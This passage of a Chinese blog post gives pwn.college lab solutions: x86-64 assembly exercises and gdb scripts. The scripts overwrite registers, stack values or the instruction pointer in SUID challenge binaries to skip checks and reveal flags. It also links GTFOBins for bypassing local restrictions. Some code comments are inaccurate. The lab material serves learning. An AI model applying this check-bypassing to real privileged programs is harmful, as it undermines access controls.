<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.global _start<br>.intel_syntax noprefix<br>_start:<br>    mov rdi,0x1337<br></code></pre></td></tr></table></figure>
<h2 id="level-5-2"><a class="markdownIt-Anchor" href="#level-5-2"></a> level 5</h2>
<p>​	这里都要求将rax作为最终存储结果的寄存器</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov rax,rdi<br>div rsi<br># 这里就是把被除数放到rax中，然后div会把rsi作为被除数，然后除以后面的寄存器，最后的除数会放在rax中。<br># rax / reg = x * rax + rdx -&gt; 就是rdx为余数，及mov rax, reg1; div reg2<br></code></pre></td></tr></table></figure>
<h2 id="level-8"><a class="markdownIt-Anchor" href="#level-8"></a> level 8</h2>
<p>​	这里的意思就是模运算就是把数字转化为二进制表示，若是模数刚好是2的次方倍n，那么这个数后面的n位就是模后的结果</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs assembly"># 这里设置了rdi,rsi的值，然后<br>rax = rdi % 256<br>rbx = rsi % 65536<br><br>mov rcx,rdi<br>mov al,cl # 最后的8位<br>mov rdx,rsi<br>mov bx,dx # 最后的32位<br></code></pre></td></tr></table></figure>
<h2 id="level-10"><a class="markdownIt-Anchor" href="#level-10"></a> level 10</h2>
<blockquote>
<p>这里是对逻辑运算的理解</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">and rdi,rsi<br>xor rax,rax # xor让rax为0<br>or rax,rdi  # 只有rax为0,后，or才能达到mov rax,rdi的目的<br></code></pre></td></tr></table></figure>
<h2 id="level-11-3"><a class="markdownIt-Anchor" href="#level-11-3"></a> level 11</h2>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs assembly"># 这里得先把最后一位拿出来(and)，需要保证单独一位，不然会影响后面的判断<br>and rdi,1	;只拿出最后一位进行判断<br>xor rdi,1<br>xor rax,rax<br>xor rax,rdi <br></code></pre></td></tr></table></figure>
<h2 id="level-18"><a class="markdownIt-Anchor" href="#level-18"></a> level 18</h2>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov rax,[rdi]<br>add rax,[rdi+8]<br>mov [rsi],rax<br># 这里quad words指的是8个字节，所以需要+8<br></code></pre></td></tr></table></figure>
<h2 id="level-21"><a class="markdownIt-Anchor" href="#level-21"></a> level 21</h2>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov rax,[rsp]<br>add rax,[rsp+0x8]<br>add rax,[rsp+0x10]<br>add rax,[rsp+0x18]<br>mov rbx,4<br>div rbx<br>mov [rsp-0x8],rax	;手动设置一下栈顶之上的值<br>sub rsp,0x8			;多加一个栈顶<br># 这里就是手动创建一个栈顶而不改变栈中其他值<br></code></pre></td></tr></table></figure>
<h2 id="level-23"><a class="markdownIt-Anchor" href="#level-23"></a> level 23</h2>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs assembly">jmp next<br>    .rept 0x51<br>        nop			;这里就是填充0x51个nop<br>    .endr<br>next:<br>    mov rax,1<br># 这里就是设置相对跳转0x51字节，使用.rept---.endr来填充多个nop指令保证跳转到相对位置<br></code></pre></td></tr></table></figure>
<h2 id="level-25"><a class="markdownIt-Anchor" href="#level-25"></a> level 25</h2>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs assembly"># 这里就是使用32位的寄存器，使用64位寄存器会报错(eax)，得注意数值精度问题，设置小精度数值，高位会自动清零<br>mov ebx,[rdi+4]<br>mov ecx,[rdi+8]<br>mov edx,[rdi+12]<br>mov eax,[rdi]<br>cmp eax,0x7f454c46<br>je equl					;相等跳转<br>mov eax,[rdi]<br>cmp eax,0x00005A4D<br>je equl2				;相等跳转<br>imul ebx,ecx<br>imul ebx,edx<br>jmp done				;强制跳转<br>equl2:<br>    sub ebx,ecx<br>    sub ebx,edx<br>    jmp done<br>equl:<br>    add ebx,ecx<br>    add ebx,edx<br>done:<br>    mov eax,ebx<br></code></pre></td></tr></table></figure>
<h2 id="level-26"><a class="markdownIt-Anchor" href="#level-26"></a> level 26</h2>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs assembly"># 这里是通过跳转表的特征来写代码的，很神奇<br>mov rax,rdi<br>and rax,0xfffffffffffffffc		;如果and之后rax大于0，那么rax本身大于3，满足<br>je nomal<br>jmp [rsi+32]					;default的情况，跳转到指定位置<br>nomal:<br>	jmp [rsi+rdi*8]				;其余情况，这里根据序号(rdi)与数值的对应关系来跳转<br></code></pre></td></tr></table></figure>
<h2 id="level-29"><a class="markdownIt-Anchor" href="#level-29"></a> level 29</h2>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov rax,0   <br>    mov rsi,rdi		;这里使用rsi指代rdi是因为调用foo函数也需要rdi传参，这两个参数不一样，需要区别对待<br>    cmp rsi,0<br>    je done<br>loop:<br>    mov bl,[rsi]<br>    cmp bl,0<br>    je done<br>    cmp bl,0x5a<br>    ja next<br>    mov dil,bl		;dil是rdi的低八位，注意精度问题<br>    mov rdx,rax		;rax作为i来存储，这里就是保存rax的内容，因为rax是foo函数的返回值<br>    mov rcx,0x403000<br>    call rcx<br>    mov [rsi],al<br>    mov rax,rdx<br>    add rax,1<br>next:           	;这个语句是都会运行的，所以要放在跳转的后面，这样才能保证都运行<br>    add rsi,1<br>    jmp loop<br>done:<br>    ret<br></code></pre></td></tr></table></figure>
<h2 id="level-30"><a class="markdownIt-Anchor" href="#level-30"></a> level 30</h2>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs assembly">push rbp<br>    mov rbp,rsp<br>    sub rsp,0x100<br>    mov rbx,-1					;都是从-1开始，以便后面先增长，再其余步骤操作<br>loop1:<br>    add rbx,1<br>    cmp rbx,rsi<br>    je lp1<br>    mov cl,byte ptr [rdi+rbx] 	;这里对于byte操作，需要对应位数的寄存器<br>    add byte ptr [rsp+rcx], 1	;这里应该是stack_base减去的，但是这里是加，巧妙利用rsp和ebp的位置关系来操作<br>    jmp loop1<br>lp1:<br>    mov rbx,-1<br>    xor rcx,rcx<br>    xor rdx,rdx<br>loop2:<br>    add rbx,1<br>    cmp rbx,0x100<br>    je lp2<br>    cmp byte ptr [rsp+rbx], cl<br>    jle loop2<br>    mov cl,byte ptr [rsp+rbx]<br>    mov rdx,rbx<br>    jmp loop2<br>lp2:<br>    mov rax,rdx<br>    mov rsp,rbp<br>    pop rbp<br>    ret<br><br>/* 题目要求<br>most_common_byte(src_addr, size):<br>  i = 0<br>  while i &lt;= size-1:<br>    curr_byte = [src_addr + i]<br>    [stack_base - curr_byte] += 1<br>    i += 1<br><br>  b = 0<br>  max_freq = 0<br>  max_freq_byte = 0<br>  while b &lt;= 0xff:<br>    if [stack_base - b] &gt; max_freq:<br>      max_freq = [stack_base - b]<br>      max_freq_byte = b<br>    b += 1<br><br>  return max_freq_byte<br>  */<br></code></pre></td></tr></table></figure>
<h1 id="debugging-refresher"><a class="markdownIt-Anchor" href="#debugging-refresher"></a> Debugging Refresher</h1>
<blockquote>
<p>这里就是对于gdb的使用方法说明，具体细节看逆向技巧那篇博客</p>
</blockquote>
<h2 id="level-3"><a class="markdownIt-Anchor" href="#level-3"></a> level 3</h2>
<p>​	搞清楚read的调用参数，这里就是寻找 <code>[rbp-0x18]</code> 的位置就是随机数的存储位置</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs assemble"># read(0,buf,size)<br>#      rdi,rsi,rdx<br>0x000055d7450d6c42 &lt;+412&gt;:   mov    ecx,eax<br>0x000055d7450d6c44 &lt;+414&gt;:   lea    rax,[rbp-0x18] # 这里就是存储着随机数的位置，<br>0x000055d7450d6c48 &lt;+418&gt;:   mov    edx,0x8<br>0x000055d7450d6c4d &lt;+423&gt;:   mov    rsi,rax #又将数值传输给rsi参数，证实了这里是中间的buf<br>0x000055d7450d6c50 &lt;+426&gt;:   mov    edi,ecx<br>0x000055d7450d6c52 &lt;+428&gt;:   call   0x55d7450d6210 &lt;read@plt&gt;<br></code></pre></td></tr></table></figure>
<h2 id="level-4-2"><a class="markdownIt-Anchor" href="#level-4-2"></a> level 4</h2>
<p>​	这里就是查看main函数的汇编代码，然后断点下在 <code>read</code> 函数处，使用 <code>ni</code> 步过函数，然后使用 <code>x/16xg $rsp</code> 查看堆栈，获得随机数后再次循环，总共需要4次</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">0x7ffe672316b0: 0x0000000000000002      0x00007ffe672317f8<br>0x7ffe672316c0: 0x00007ffe672317e8      0x00000001e51e4d60<br>0x7ffe672316d0: 0x0000000000000000      0xedff817a527d0977#这个0xedff817a527d0977就是随机数<br>0x7ffe672316e0: 0x00007ffe672317e0      0x54a353c8e7fd5400<br></code></pre></td></tr></table></figure>
<h2 id="level-5-3"><a class="markdownIt-Anchor" href="#level-5-3"></a> level 5</h2>
<blockquote>
<p>这里获得flag要有suid位，也就是用 <code>/challenge/embryogdb_level5 -x e.gdb</code> 来运行脚本</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">e.gdb脚本如下</span><br>run<br>b *main+762 #这里就是scanf和read之后的一个地方，这样可以直接设置数据了<br>commands<br>    silent<br>    set *(unsigned long long*)($rbp-0x10) = *(unsigned long long*)($rbp-0x18)<br>    continue<br>end<br>run rebort<br></code></pre></td></tr></table></figure>
<h2 id="level-6"><a class="markdownIt-Anchor" href="#level-6"></a> level 6</h2>
<h3 id="wp1-3"><a class="markdownIt-Anchor" href="#wp1-3"></a> wp1</h3>
<p>​	这里按照 level 5的方案，计算随机值，但是很怪，在 <code>You input: </code> 的时候输入一个 <code>q</code> ，然后后面的输入就都跳过了，直接出flag了</p>
<h3 id="wp2-3"><a class="markdownIt-Anchor" href="#wp2-3"></a> wp2</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">0x00005646508e8d4c &lt;+678&gt;:   mov    rdx,QWORD PTR [rbp-0x10]<br>0x00005646508e8d50 &lt;+682&gt;:   mov    rax,QWORD PTR [rbp-0x18]<br>0x00005646508e8d54 &lt;+686&gt;:   cmp    rdx,rax<br>0x00005646508e8d57 &lt;+689&gt;:   je     0x5646508e8d63 &lt;main+701&gt;<br></code></pre></td></tr></table></figure>
<p>​	这里就是关键是 cmp rdx,rax。如果相同的话，那么直接跳转到下面的函数，它之后会执行win函数。这样达到调整控制流的目的。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs assembly">run<br>break *main+686<br>commands<br>    silent<br>    set $rdx = $rax<br>    continue<br>end<br>run rebort<br></code></pre></td></tr></table></figure>
<h2 id="level-7-2"><a class="markdownIt-Anchor" href="#level-7-2"></a> level 7</h2>
<p>​	很惊奇，直接 <code>call (void)win()</code> 调用函数就出了，一开始还想着劫持返回地址来跳转来着，看来是想麻烦了。</p>
<p>​	这里补充gdb中可以调用函数的约束</p>
<ol>
<li><strong>函数必须是可见的</strong>：在 GDB 中调用的函数必须是在当前调试的程序的可执行代码中可见的。如果函数是在外部库或未加载的模块中定义的，GDB 将无法直接调用它。</li>
<li><strong>函数必须是没有副作用的</strong>：GDB 中的函数调用是在调试过程中进行的，调用函数可能会影响程序状态，包括改变变量的值等。因此，最好只在调试过程中调用没有副作用的函数，以避免意外行为。</li>
</ol>
<h2 id="level-8-2"><a class="markdownIt-Anchor" href="#level-8-2"></a> level 8</h2>
<p>​	这里是 win 函数出现了问题</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs assembly">0x0000556954fad951 &lt;+0&gt;:     endbr64 <br>0x0000556954fad955 &lt;+4&gt;:     push   rbp<br>0x0000556954fad956 &lt;+5&gt;:     mov    rbp,rsp<br>0x0000556954fad959 &lt;+8&gt;:     sub    rsp,0x10<br>0x0000556954fad95d &lt;+12&gt;:    mov    QWORD PTR [rbp-0x8],0x0<br>0x0000556954fad965 &lt;+20&gt;:    mov    rax,QWORD PTR [rbp-0x8]<br>0x0000556954fad969 &lt;+24&gt;:    mov    eax,DWORD PTR [rax] #此时rax=0，访问非法地址异常，所以这里有问题，出现segfault fault<br>0x0000556954fad96b &lt;+26&gt;:    lea    edx,[rax+0x1]<br>0x0000556954fad96e &lt;+29&gt;:    mov    rax,QWORD PTR [rbp-0x8]<br>0x0000556954fad972 &lt;+33&gt;:    mov    DWORD PTR [rax],edx<br>0x0000556954fad974 &lt;+35&gt;:    lea    rdi,[rip+0x73e]        # 0x556954fae0b9<br>0x0000556954fad97b &lt;+42&gt;:    call   0x556954fad180 &lt;puts@plt&gt;<br></code></pre></td></tr></table></figure>
<p>​	这里就是跳转即可</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">(gdb)set $rip=0x0000556954fad97b<br>(gdb)c<br></code></pre></td></tr></table></figure>
<h1 id="others"><a class="markdownIt-Anchor" href="#others"></a> Others</h1>
<h2 id="网站"><a class="markdownIt-Anchor" href="#网站"></a> 网站</h2>
<ul>
<li><a target="_blank" rel="noopener" href="https://gtfobins.github.io/">GTFOBins</a> -&gt; GTFOBins is a curated list of Unix binaries that can be used to bypass local security restrictions in misconfigured systems.</li>
</ul>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://tinysnow.github.io/%E6%8A%80%E6%9C%AF/%E5%85%B6%E4%BB%96%E8%B5%84%E6%96%99/pwn.college-writeup.html#program-interaction">参考wp1</a> <a target="_blank" rel="noopener" href="https://www.buryia.top/">参考wp2</a> <a target="_blank" rel="noopener" href="https://www.freebuf.com/author/thundersword">参考wp3</a> <a target="_blank" rel="noopener" href="https://dem0dem0.top/2023/12/03/program_misuse/">参考wp4</a> <a target="_blank" rel="noopener" href="https://tokameine.top">参考wp5</a> <a target="_blank" rel="noopener" href="https://j-shiro.github.io/p/introduction/">参考wp6</a></p>
</blockquote>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
    <div class="post-meta mr-3 d-flex align-items-center">
      <i class="iconfont icon-category"></i>
      

<span class="category-chains">
  
  
    
      <span class="category-chain">
        
  <a href="/categories/Pwn%E7%AC%94%E8%AE%B0/" class="category-chain-item">Pwn笔记</a>
  
  

      </span>
    
  
</span>

    </div>
  
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>Pwn.college(1)</div>
      <div>http://example.com/posts/9b840b21.html</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>作者</div>
          <div>Nuthecz</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>发布于</div>
          <div>2024年1月18日</div>
        </div>
      
      
      
        <div class="license-meta-item">
          <div>许可协议</div>
          <div>
            
              
              
                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
                    <i class="iconfont icon-by"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/posts/594d9f6c.html" title="周报">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">周报</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/posts/7dd931db.html" title="白盒AES">
                        <span class="hidden-mobile">白盒AES</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>
      目录
    </span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>


  </aside>


    </div>
  </div>
</div>





  



  



  



  



  







    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
    </div>
  
  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




   <script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
  var toc = jQuery('#toc');
  if (toc.length === 0 || !window.tocbot) { return; }
  var boardCtn = jQuery('#board-ctn');
  var boardTop = boardCtn.offset().top;

  window.tocbot.init(Object.assign({
  tocSelector : '#toc-body',
  contentSelector : '.markdown-body',
  linkClass : 'tocbot-link',
  activeLinkClass : 'tocbot-active-link',
  listClass : 'tocbot-list',
  isCollapsedClass: 'tocbot-is-collapsed',
  collapsibleClass: 'tocbot-is-collapsible',
  scrollSmooth : true,
  includeTitleTags: true,
  headingsOffset : -boardTop,
  }, CONFIG.toc));
  if (toc.find('.toc-list-item').length > 0) {
  toc.css('visibility', 'visible');
  }

  Fluid.events.registerRefreshCallback(function() {
  if ('tocbot' in window) {
  tocbot.refresh();
  var toc = jQuery('#toc');
  if (toc.length === 0 || !tocbot) {
  return;
  }
  if (toc.find('.toc-list-item').length > 0) {
  toc.css('visibility', 'visible');
  }
  }
  });
  });
  </script>
  

  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script  src="/js/local-search.js" ></script>





<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
  </noscript>
<!-- hexo injector body_end start --><script src="/js/backgroundize.js"></script><!-- hexo injector body_end end --></body>
</html>
